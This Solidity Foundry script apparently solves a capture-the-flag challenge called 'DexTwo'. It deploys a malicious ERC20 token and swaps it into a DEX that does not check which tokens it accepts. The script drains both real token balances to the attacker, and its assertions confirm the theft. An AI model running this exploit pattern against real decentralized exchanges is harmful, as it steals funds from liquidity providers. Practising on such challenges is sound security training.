// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "forge-std/Test.sol";

import {DexTwo} from "../src/DexTwo.sol";
import {SwappableTokenTwo} from "../src/SwappableTokenTwo.sol";
import {MaliciousERC20} from "../src/MaliciousERC20.sol";

contract AttackScript is Script, Test {
    DexTwo public dex = DexTwo(vm.envAddress("DEX"));
    SwappableTokenTwo public token1;
    SwappableTokenTwo public token2;
    MaliciousERC20 public maliciousToken;

    function run() public {
        address deployer = vm.rememberKey(vm.envUint("PRIVATE_KEY"));

        vm.startBroadcast(deployer);

        token1 = SwappableTokenTwo(dex.token1());
        token2 = SwappableTokenTwo(dex.token2());

        maliciousToken = new MaliciousERC20();

        // attack
        maliciousToken.approve(address(dex), type(uint256).max);
        maliciousToken.transfer(address(dex), 100);
        dex.swap(address(maliciousToken), address(token1), 100);
        dex.swap(address(maliciousToken), address(token2), 200);

        // check
        assertEq(token1.balanceOf(address(dex)), 0);
        assertEq(token2.balanceOf(address(dex)), 0);
        assertEq(token1.balanceOf(deployer), 110);
        assertEq(token2.balanceOf(deployer), 110);

        vm.stopBroadcast();
    }
}
